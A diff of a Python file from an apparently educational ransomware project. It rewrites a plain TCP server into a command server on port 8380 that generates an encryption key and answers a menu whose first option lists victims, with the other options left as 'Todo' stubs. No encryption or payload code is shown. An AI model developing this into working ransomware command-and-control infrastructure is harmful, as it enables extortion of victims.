@@ -1,3 +1,4 @@
+#!/usr/bin/python
 # --------------------------------------------
 
 # Ransomware Project for educational purposes
@@ -10,61 +11,46 @@
 # Importations
 # --------------------------------------------
 import socket
-from threading import Thread
-from socketserver import ThreadingMixIn
+import threading
+import security
+import os
+import binascii
+import utile.data as udata
 # --------------------------------------------
-# CLasses
+# Classes & Functions
 # --------------------------------------------
-class customThread(Thread):
+class server_tcp(object):
+
     def __init__(self, ip, port):
-        Thread.__init__(self)
         self.ip = ip
         self.port = port
-        print('[+] Nouveau thread démarré pour ' + ip + ":" + str(port))
-
-    def run(self):
-        msg = input('Entrer la réponse du serveur ou STOP pour sortir : ')
-        while msg != "STOP":
-            data = con.recv(2048)
-            print(f'Le serveur a recu des données {data}')
-            msg = input('Entrer la réponse du serveur ou STOP pour sortir : ')
-            if msg == 'STOP':
-                break
-            con.send(bytes(msg, 'utf-8'))
-
-# --------------------------------------------
-# Functions
-# --------------------------------------------
+        self.encryptkey = os.urandom(32)
 
 
-def check_packet_validity(header, message):
-    """
-    Protocole servant à contrôler la validité d'un packet en fonction de la taille de son header
-    :param header: packet's header
-    :type header: str
-    :param message: packet's message
-    :type message: str
-    :return: True if packet is valid or False if not
-    :rtype: bool
-    """
-    return message[9:9+header]
+    def start_server(self):
+        self.s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        print(f'$ Server started ! Waiting for clients...')
+        try:
+            self.s.bind((self.ip, self.port))
+        except socket.error as error:
+            print(str(error))
+        self.s.listen(10)
+        conn, addr = self.s.accept()
+        print(f'[+] New TCP Connexion from ' + str(addr[0])+":"+str(addr[1]))
+        while 1:
+            msg = conn.recv(2048)
+            print(str(addr[0]) + " >> " + str(msg))
+            rs = str(self.gestion_msg(msg))
+            conn.send(bytes(rs, 'utf-8'))
 
-# --------------------------------------------
-# Program
-# --------------------------------------------
-s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-s.setsockopt(socket.SOL_SOCKET, socket.SOCK_STREAM, 1)
-s.bind(('', 8380))
-threads = []
 
-while True:
-    s.listen(5)
-    print("Serveur: en attente de connexions des clients TCP ...")
-    (con, (ip, port)) = s.accept()
-    mycustomThread = customThread(ip, port)
-    mycustomThread.start()
-    threads.append(mycustomThread)
+    def gestion_msg(self, message):
+        if message == b'1':
+            return udata.list_victim()
+        elif message == b'2':
+            return "Todo2"
+        elif message == b'3':
+            return "Todo3"
 
-for t in threads:
-    t.join()
-
+srv = server_tcp("", 8380)
+srv.start_server()
